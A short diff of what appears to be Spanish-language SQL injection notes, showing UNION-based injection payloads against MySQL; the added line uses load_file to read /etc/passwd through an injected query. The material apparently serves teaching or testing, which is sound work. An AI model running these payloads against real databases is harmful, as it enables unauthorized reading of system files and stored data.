@@ -57,7 +57,7 @@ SELECT username, password FROM users WHERE x = '%s' UNION SELECT NULL,NULL;-- -'
 -- Por ejemplo con mysql:
 
 SELECT username, email FROM users WHERE x = '%s' UNION SELECT version(),null;-- -';
-
+SElECT username, email FROM users WHERE x = '%s' UNION SELECT load_file("/etc/passwd"), null;-- -
 -- output:
 
 --|                                                  email                                                   |       password        
